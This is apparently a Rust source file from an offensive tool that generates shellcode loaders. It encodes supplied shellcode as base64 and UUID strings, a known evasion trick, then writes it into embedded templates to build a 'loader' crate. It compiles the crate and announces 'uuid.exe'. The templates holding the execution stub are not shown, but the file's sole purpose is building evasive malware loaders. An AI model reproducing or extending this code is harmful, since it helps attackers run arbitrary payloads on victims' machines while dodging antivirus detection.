use rust_embed::RustEmbed;
use std::fs::{write,create_dir_all};
use whoami;
use rsmaker::{complie,uuid_base64};


#[derive(RustEmbed)]
#[folder = "temp"]
struct Asset;






pub fn make_rs(base64_shellcode:String)->(){
    let head = Asset::get("uuid/head.rs").unwrap();
    let head_str = std::str::from_utf8(head.data.as_ref()).unwrap();

    let model = Asset::get("uuid/model.rs").unwrap();
    let model_str = std::str::from_utf8(model.data.as_ref()).unwrap();

    let toml = Asset::get("uuid/Cargo.toml").unwrap();
    let toml_str = std::str::from_utf8(toml.data.as_ref()).unwrap();

    let config = Asset::get("uuid/config.toml").unwrap();
    let   config_str = std::str::from_utf8(config.data.as_ref()).unwrap();

    let real = format!("let mut real = \"{}\";\n",base64_shellcode);
    let real2 = format!("let mut real = base64_decode(real.to_string());\n");
    let uuidarr = format!("let uuidarr:Vec<&str> = real.split(\",\").collect();\n");
    let size = format!("let SIZE =uuidarr.len();\n");

    let mut new_string = String::from("");

    new_string.push_str(head_str);
    new_string.push_str("\n");
    new_string.push_str(&real);
    new_string.push_str(&real2);
    new_string.push_str(&uuidarr);
    new_string.push_str(&size);
    new_string.push_str(model_str);

    let _ = create_dir_all("loader/src");
    let _ = create_dir_all("loader/.cargo");
    let _ = write(format!("loader/src/main.rs"), new_string);
    let _ = write(format!("loader/Cargo.toml"), toml_str);
    let config_str = &config_str.replace("XXXXXXXX", &whoami::username());
    let _ = write(format!("loader/.cargo/config.toml"), config_str);

}




pub fn run(shellcode:Vec<u8>)->std::io::Result<()>{
    println!("current username is {}",whoami::username());


    let base64_shellcode = uuid_base64(shellcode);
    println!("Encrypting shellcode...");
    println!("Done...");

    make_rs(base64_shellcode);

    println!("Compiling please wait.....");
    
    complie();

    println!("Succeed!,the loader name is uuid.exe, enjoy :)");
    Ok(())
}